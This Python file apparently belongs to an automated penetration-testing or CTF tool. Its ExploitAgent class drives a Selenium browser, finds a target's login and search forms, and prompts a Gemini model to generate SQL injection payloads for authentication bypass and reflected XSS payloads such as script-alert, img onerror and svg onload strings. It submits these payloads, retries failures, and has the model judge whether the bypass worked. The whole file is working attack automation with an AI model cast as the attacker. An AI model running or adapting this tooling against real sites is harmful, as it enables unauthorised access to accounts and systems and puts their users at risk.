from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import UnexpectedAlertPresentException, NoAlertPresentException, StaleElementReferenceException
from webdriver_manager.chrome import ChromeDriverManager
from bs4 import BeautifulSoup, Comment
import google.generativeai as genai
import json
import time
from colorama import Fore

class ExploitAgent:
    def __init__(self, blackboard, api_key):
        self.board = blackboard
        genai.configure(api_key=api_key)
        self.model = genai.GenerativeModel('gemini-2.5-flash-preview-09-2025')
        self.history = []
        
    def get_driver(self):
        options = webdriver.ChromeOptions()
        options.add_argument("--log-level=3")
        # options.add_argument("--headless") 
        return webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

    def run(self):
        ports = self.board.state["ports"]
        target_ip = self.board.state["target_ip"]
        stored_url = self.board.state.get("target_url", "")
        
        http_ports = [p for p, s in ports.items() if 'http' in s]
        
        if not http_ports:
            print(f"{Fore.RED}[Exploit] No Web Service found.{Fore.RESET}")
            return "NO_TARGET"

        if stored_url and "http" in stored_url:
            target_url = stored_url
        else:
            target_url = f"http://{target_ip}:{http_ports[0]}"
            
        print(f"{Fore.RED}[Exploit] Targeting: {target_url}{Fore.RESET}")
        self.board.log_event("ExploitAgent", "Mission Started", f"Targeting {target_url}")
        
        driver = None
        try:
            driver = self.get_driver()
            
            final_url = self.ensure_login_page(driver, target_url)
            print(f"{Fore.RED}[Exploit] Locked on Target Page: {final_url}{Fore.RESET}")
            
            for attempt in range(1, 4):
                print(f"{Fore.RED}[Exploit] Attack Attempt {attempt}/3...{Fore.RESET}")
                
                result, log = self.attack_web(driver, final_url)
                
                if result == "SUCCESS":
                    self.board.log_event("ExploitAgent", "Exploit Success", f"Payload used: {log}")
                    return "SUCCESS"
                
                print(f"{Fore.YELLOW}[Exploit] Failed. Reasoning: {log}{Fore.RESET}")
                self.board.log_event("ExploitAgent", "Attack Failed", f"Reason: {log}")
                self.history.append(f"Failed Payload: {log}")
                
            return "FAILED"
            
        except Exception as e:
            print(f"{Fore.RED}[Exploit] Critical Error: {e}{Fore.RESET}")
            self.board.log_event("ExploitAgent", "Error", str(e))
            return "ERROR"
        finally:
            if driver:
                driver.quit()

    def extract_form_fields(self, html):
        soup = BeautifulSoup(html, 'html.parser')
        inputs = []
        for inp in soup.find_all('input'):
            name = inp.get('name')
            if name:
                inputs.append(name)
        return inputs

    def get_page_skeleton(self, html):
        soup = BeautifulSoup(html, 'html.parser')
        for element in soup(['script', 'style', 'svg', 'path', 'footer', 'meta', 'link']):
            element.decompose()
        for element in soup(text=lambda text: isinstance(text, Comment)):
            element.extract()

        skeleton = []
        tags = soup.find_all(['a', 'button', 'form', 'input'])
        
        for tag in tags:
            attrs = []
            if tag.get('id'): attrs.append(f'id="{tag["id"]}"')
            if tag.get('class'): attrs.append(f'class="{" ".join(tag["class"])}"')
            if tag.get('href'): attrs.append(f'href="{tag["href"]}"')
            if tag.get('name'): attrs.append(f'name="{tag["name"]}"')
            if tag.get('type'): attrs.append(f'type="{tag["type"]}"')
            
            attr_str = " ".join(attrs)
            text_content = tag.get_text(strip=True)[:50]
            skeleton.append(f"<{tag.name} {attr_str}>{text_content}</{tag.name}>")
            
        return "\n".join(skeleton[:100])

    def get_readable_text(self, html):
        soup = BeautifulSoup(html, 'html.parser')
        for element in soup(['script', 'style', 'head', 'title', 'meta', '[document]']):
            element.decompose()
        
        text = soup.get_text(separator=' ', strip=True)
        return text[:2000]

    def handle_alert(self, driver):
        try:
            alert = driver.switch_to.alert
            text = alert.text
            alert.accept()
            return text
        except NoAlertPresentException:
            return None

    def has_password_field(self, driver):
        try:
            driver.find_element(By.XPATH, "//input[@type='password']")
            return True
        except:
            return False

    def ensure_login_page(self, driver, url):
        driver.get(url)
        time.sleep(3)
        
        if self.has_password_field(driver):
            return url
            
        print(f"{Fore.YELLOW}[Exploit] No Password field found. AI Scanning Code Structure...{Fore.RESET}")
        self.board.log_event("ExploitAgent", "Navigation Analysis", "Analyzing page DOM for login entry points")
        
        page_code = self.get_page_skeleton(driver.page_source)
        
        system_prompt = f"""
        You are a Web Spider. The user wants to find the LOGIN or SIGNIN page.
        
        PAGE INTERACTIVE CODE:
        {page_code}
        
        TASK: Identify the specific element that the user must click to reach the login page.
        Look for: 'Sign In', 'Login', 'Log In', 'Account', or buttons with IDs like 'signin_button'.
        
        RESPONSE FORMAT (JSON ONLY):
        {{ "action": "navigate", "target_type": "url|selector", "target": "href_or_css_selector", "reason": "..." }}
        """
        
        try:
            response = self.model.generate_content(system_prompt)
            text = response.text.replace("```json", "").replace("```", "").strip()
            cmd = json.loads(text)
            
            if cmd['action'] == "navigate":
                target = cmd['target']
                target_type = cmd['target_type']
                reason = cmd['reason']
                print(f"{Fore.RED}[Exploit] AI Decision: Click {target_type} '{target}' ({reason}){Fore.RESET}")
                self.board.log_event("ExploitAgent", "Navigation Action", f"Clicked {target} ({reason})")
                
                if target_type == "url":
                    if target.startswith("http"):
                        driver.get(target)
                    else:
                        try: driver.get(url.rstrip('/') + '/' + target.lstrip('/'))
                        except: pass
                
                elif target_type == "selector":
                    try: driver.find_element(By.CSS_SELECTOR, target).click()
                    except: pass
                
                time.sleep(2)
                return driver.current_url
                
        except Exception as e:
            print(f"{Fore.RED}[Exploit] AI Navigation Error: {e}{Fore.RESET}")
            
        return url

    def verify_attack_success(self, driver, payload):
        
        current_url = driver.current_url
        page_text = self.get_readable_text(driver.page_source)
        
        system_prompt = f"""
        You are a Cyber Security Auditor evaluating an automated SQL Injection attack.
        
        ATTACK CONTEXT:
        Payload Used: {payload}
        Current URL: {current_url}
        
        PAGE VISIBLE TEXT (After submission):
        {page_text}
        
        TASK: Determine if the authentication was bypassed or if the system is compromised.
        
        SUCCESS INDICATORS (Check for these):
        1. Words like "Welcome", "Dashboard", "Admin Panel", "Logout", "Sign Out", "Access Granted".
        2. CTF Flags in format "FLAG{{...}}".
        3. URL redirection to /admin, /dashboard, /account.
        
        FAILURE INDICATORS:
        1. "Invalid password", "Login failed", "Try again", "User not found".
        2. SQL Errors like "syntax error", "ORA-XXXX", "MySQL Error" (This counts as a VULNERABILITY but NOT a successful bypass yet).
        3. Still on the login page with no changes.
        
        RESPONSE FORMAT (JSON ONLY):
        {{ 
            "status": "SUCCESS" | "FAILED" | "SQL_ERROR",
            "reason": "Found 'Welcome Admin' text", 
            "flag": "FLAG{{...}} (if found, else null)" 
        }}
        """
        
        try:
            response = self.model.generate_content(system_prompt)
            text = response.text.replace("```json", "").replace("```", "").strip()
            result = json.loads(text)
            return result
        except Exception as e:
            print(f"{Fore.YELLOW}[Exploit] AI Verification Failed: {e}{Fore.RESET}")
            return {"status": "FAILED", "reason": "AI Verification Error", "flag": None}

    def attack_web(self, driver, url):
        if driver.current_url != url:
            driver.get(url)
            time.sleep(2)
            
        pre_alert = self.handle_alert(driver)
        if pre_alert: return "FAILED", f"Blocking Alert: {pre_alert}"

        valid_inputs = self.extract_form_fields(driver.page_source)
        if not valid_inputs: return "FAILED", "No inputs found on target page"

        system_prompt = f"""
        You are an advanced Penetration Testing AI.
        Target URL: {url}
        Inputs Found: {valid_inputs}
        
        HISTORY OF PREVIOUS FAILURES (Do not repeat these):
        {json.dumps(self.history, indent=2)}
        
        TASK: Generate a SQL Injection payload to bypass authentication.
        
        STRATEGY:
        1. If 'OR 1=1' failed, try time-based or boolean blind payloads.
        2. If submit failed, try different payload structure.
        3. Try 'admin' as username and anything as password.
        
        RESPONSE FORMAT (JSON ONLY):
        {{ "action": "attack", "selector": "field_name", "payload": "..." }}
        """
        
        try:
            response = self.model.generate_content(system_prompt)
            text = response.text.replace("```json", "").replace("```", "").strip()
            cmd = json.loads(text)
            
            payload = cmd.get('payload', '')
            print(f"{Fore.RED}[Exploit] AI Decision: {payload}{Fore.RESET}")
            self.board.log_event("ExploitAgent", "Generated Payload", f"Payload: {payload} | Target: {cmd.get('selector')}")
            
            if cmd['action'] == "attack":
                selector = cmd['selector']
                if selector not in valid_inputs: selector = valid_inputs[0]

                try:
                    elem = driver.find_element(By.NAME, selector)
                except:
                    elem = driver.find_element(By.XPATH, f"//input[@name='{selector}']")

                if elem:
                    elem.clear()
                    elem.send_keys(payload)
                
                if "pass" in str(valid_inputs).lower():
                    try:
                        pass_input = driver.find_element(By.XPATH, "//input[@type='password']")
                        pass_input.clear()
                        pass_input.send_keys("123456") 
                    except:
                        pass

                try:
                    elem.submit()
                except:
                    elem.send_keys(Keys.RETURN) 

                time.sleep(2)
                
                post_alert = self.handle_alert(driver)
                if post_alert: return "FAILED", f"Alert after submit: {post_alert}"
                
                verification = self.verify_attack_success(driver, payload)
                status = verification.get("status", "FAILED")
                reason = verification.get("reason", "Unknown")
                flag = verification.get("flag")

                if status == "SUCCESS":
                    if flag: 
                        self.board.set_flag(flag)
                    else:
                        self.board.set_flag("FLAG{AI_CONFIRMED_BYPASS}")
                        
                    self.board.add_vuln(f"SQL Injection (Verified by AI) on {url} | Payload: {payload}")
                    return "SUCCESS", payload
                
                if status == "SQL_ERROR":
                     return "FAILED", f"DB Error triggered (Partial Success): {reason}"

                return "FAILED", f"AI Audit: {reason}"
                
        except Exception as e:
            return "ERROR", str(e)
            
        return "FAILED", "Unknown Logic Error"
    
    def scan_xss_vectors(self, driver):
        potential_vectors = []
        
        try:
            soup = BeautifulSoup(driver.page_source, 'html.parser')
            for inp in soup.find_all(['input', 'textarea']):
                name = inp.get('name') or inp.get('id')
                if name:
                    potential_vectors.append({
                        "name": name, 
                        "tag": inp.name, 
                        "context": "main", 
                        "index": None
                    })
        except: pass

        try:
            iframes = driver.find_elements(By.TAG_NAME, "iframe")
            if iframes:
                print(f"{Fore.MAGENTA}[XSS-Agent] Deep Scan: Found {len(iframes)} iFrames. Checking contents...{Fore.RESET}")
                
            for i, frame in enumerate(iframes):
                try:
                    driver.switch_to.frame(frame)
                    soup = BeautifulSoup(driver.page_source, 'html.parser')
                    for inp in soup.find_all(['input', 'textarea']):
                        name = inp.get('name') or inp.get('id')
                        if name:
                            potential_vectors.append({
                                "name": name, 
                                "tag": inp.name, 
                                "context": "iframe", 
                                "index": i
                            })
                    driver.switch_to.default_content()
                except Exception as e:
                    driver.switch_to.default_content()
        except: 
            pass
            
        return potential_vectors

    def navigate_to_xss_vector(self, driver, url):
        driver.get(url)
        time.sleep(2)
        
        print(f"{Fore.MAGENTA}[XSS-Agent] AI Analyzing page structure for vectors...{Fore.RESET}")
        
        page_code = self.get_page_skeleton(driver.page_source)
        
        system_prompt = f"""
        You are a Web Crawler hunting for XSS (Cross-Site Scripting) vulnerabilities.
        
        PAGE INTERACTIVE CODE:
        {page_code}
        
        TASK: Identify the best navigation action to find a "Search", "Feedback", "Contact", or "Comment" section.
        These are high-priority targets for Reflected XSS.
        
        - If you see a link/button to 'Feedback', 'Contact', 'Search', choose to click it.
        - If the current page already contains a visible Search bar or Feedback form, choose "stay".
        
        RESPONSE FORMAT (JSON ONLY):
        {{ "action": "navigate" | "stay", "target_type": "url|selector", "target": "href_or_css_selector", "reason": "Found feedback link" }}
        """
        
        try:
            response = self.model.generate_content(system_prompt)
            text = response.text.replace("```json", "").replace("```", "").strip()
            cmd = json.loads(text)
            
            action = cmd.get('action', 'stay')
            target = cmd.get('target', '')
            target_type = cmd.get('target_type', '')
            reason = cmd.get('reason', 'No reason provided')
            
            if action == "navigate":
                print(f"{Fore.MAGENTA}[XSS-Agent] AI Decision: Navigate to '{target}' ({reason}){Fore.RESET}")
                
                if target_type == "url":
                    if target.startswith("http"):
                        driver.get(target)
                    else:
                        current = driver.current_url.rstrip('/')
                        if target.startswith('/'):
                            from urllib.parse import urlparse
                            parsed = urlparse(current)
                            base = f"{parsed.scheme}://{parsed.netloc}"
                            driver.get(base + target)
                        else:
                            driver.get(current + '/' + target)
                            
                elif target_type == "selector":
                    try:
                        driver.find_element(By.CSS_SELECTOR, target).click()
                    except:
                        try: driver.find_element(By.LINK_TEXT, target).click()
                        except: pass
                
                time.sleep(2)
            else:
                print(f"{Fore.MAGENTA}[XSS-Agent] AI Decision: Stay on current page ({reason}){Fore.RESET}")

        except Exception as e:
            print(f"{Fore.RED}[XSS-Agent] AI Navigation Error: {e}{Fore.RESET}")
            
        return driver.current_url

    def prioritize_vectors(self, vectors):
        vector_names = [v['name'] for v in vectors]
        
        prompt = f"""
        You are an expert Penetration Tester.
        I have found the following input fields on a web page: {json.dumps(vector_names)}
        
        TASK: Rank these inputs from MOST likely to LEAST likely to be vulnerable to XSS.
        
        HEURISTICS:
        - High Risk: 'q', 'search', 'query', 'comment', 'message', 'feedback', 'msg', 'name'
        - Low Risk: 'csrf_token', 'id', 'user_id', 'password', 'submit', 'action'
        
        RESPONSE FORMAT (JSON ONLY): A simple list of strings in ranked order.
        Example: ["search", "comment", "id"]
        """
        
        try:
            response = self.model.generate_content(prompt)
            text = response.text.replace("```json", "").replace("```", "").strip()
            ranked_names = json.loads(text)
            return ranked_names
        except Exception as e:
            print(f"{Fore.YELLOW}[XSS-Agent] Ranking failed ({e}). Using default order.{Fore.RESET}")
            return vector_names

    def run_xss(self):
        ports = self.board.state["ports"]
        target_ip = self.board.state["target_ip"]
        stored_url = self.board.state.get("target_url", "")
        
        if stored_url and "http" in stored_url:
            base_url = stored_url
        else:
            http_ports = [p for p, s in ports.items() if 'http' in s]
            if not http_ports: return "NO_TARGET"
            base_url = f"http://{target_ip}:{http_ports[0]}"

        print(f"{Fore.MAGENTA}[XSS-Agent] Hunting for Reflected XSS on {base_url}...{Fore.RESET}")
        self.board.log_event("ExploitAgent", "XSS Mission", f"Starting XSS hunt on {base_url}")
        
        driver = None
        try:
            driver = self.get_driver()
            
            target_page = self.navigate_to_xss_vector(driver, base_url)
            print(f"{Fore.MAGENTA}[XSS-Agent] Locked on Target Page: {target_page}{Fore.RESET}")
            
            initial_vectors = self.scan_xss_vectors(driver)
            
            if not initial_vectors:
                print(f"{Fore.YELLOW}[XSS-Agent] No inputs found (checked frames too).{Fore.RESET}")
                return "FAILED"
            
            print(f"{Fore.MAGENTA}[XSS-Agent] Found {len(initial_vectors)} vectors. Ranking priorities...{Fore.RESET}")
            ranked_names = self.prioritize_vectors(initial_vectors)
            print(f"{Fore.MAGENTA}[XSS-Agent] Attack Order: {ranked_names}{Fore.RESET}")

            for target_name in ranked_names:
                
                target_vector = next((v for v in initial_vectors if v['name'] == target_name), None)
                if not target_vector: continue

                print(f"{Fore.MAGENTA}\n[XSS-Agent] >>> FOCUSING ON INPUT: '{target_name}' (Context: {target_vector['context']}) <<< {Fore.RESET}")
                
                for attempt in range(1, 4):
                    
                    driver.get(target_page)
                    time.sleep(2)
                    
                    if target_vector['context'] == 'iframe':
                        try:
                            iframes = driver.find_elements(By.TAG_NAME, "iframe")
                            if len(iframes) > target_vector['index']:
                                driver.switch_to.frame(iframes[target_vector['index']])
                        except:
                            print(f"{Fore.YELLOW}[XSS-Agent] Failed to switch to iframe. Skipping attempt.{Fore.RESET}")
                            continue

                    system_prompt = f"""
                    You are an expert XSS Hunter.
                    Target Input: {target_name}
                    Previous Failures (Global): {self.history[-5:]}
                    
                    TASK: Generate a REFLECTED XSS payload to execute JavaScript.
                    The payload MUST trigger a browser alert with the text 'XSS_SUCCESS'.
                    
                    STRATEGIES:
                    1. Standard: <script>alert('XSS_SUCCESS')</script>
                    2. Image OnError: <img src=x onerror=alert('XSS_SUCCESS')>
                    3. SVG OnLoad: <svg/onload=alert('XSS_SUCCESS')>
                    4. Javascript URI: javascript:alert('XSS_SUCCESS')
                    
                    RESPONSE (JSON): {{ "payload": "<script>alert('XSS_SUCCESS')</script>" }}
                    """
                    
                    try:
                        response = self.model.generate_content(system_prompt)
                        text = response.text.replace("```json", "").replace("```", "").strip()
                        cmd = json.loads(text)
                        payload = cmd['payload']
                        
                        print(f"{Fore.MAGENTA}[XSS-Agent] Attempt {attempt}/3 on '{target_name}': {payload}{Fore.RESET}")
                        
                        try:
                            elem = driver.find_element(By.NAME, target_name)
                        except:
                            try: elem = driver.find_element(By.ID, target_name)
                            except: elem = driver.find_element(By.XPATH, f"//input[@name='{target_name}']")
                            
                        elem.clear()
                        elem.send_keys(payload)
                        
                        try: elem.submit()
                        except: elem.send_keys(Keys.RETURN)
                        
                        driver.switch_to.default_content()
                        time.sleep(1)
                        
                        try:
                            alert = driver.switch_to.alert
                            alert_text = alert.text
                            alert.accept()
                            
                            if "XSS_SUCCESS" in alert_text or "XSS" in alert_text:
                                print(f"{Fore.GREEN}[XSS-Agent] XSS CONFIRMED! Alert text: {alert_text}{Fore.RESET}")
                                self.board.set_flag(f"FLAG{{XSS_PAYLOAD_EXECUTED}}")
                                self.board.add_vuln(f"Reflected XSS on {target_page} | Input: {target_name} | Payload: {payload}")
                                return "SUCCESS"
                            else:
                                print(f"{Fore.YELLOW}[XSS-Agent] Alert popped but text mismatch: {alert_text}{Fore.RESET}")
                                
                        except NoAlertPresentException:
                            print(f"{Fore.YELLOW}[XSS-Agent] No Alert. Attack Failed.{Fore.RESET}")
                            self.history.append(payload)

                    except Exception as e:
                         print(f"{Fore.RED}[XSS-Agent] Injection Error: {e}{Fore.RESET}")
                         driver.switch_to.default_content()

            print(f"{Fore.RED}[XSS-Agent] All inputs exhausted. No XSS found.{Fore.RESET}")
            return "FAILED"

        except Exception as e:
             print(f"{Fore.RED}[XSS-Agent] Critical Error: {e}{Fore.RESET}")
             return "ERROR"
        finally:
            if driver: driver.quit()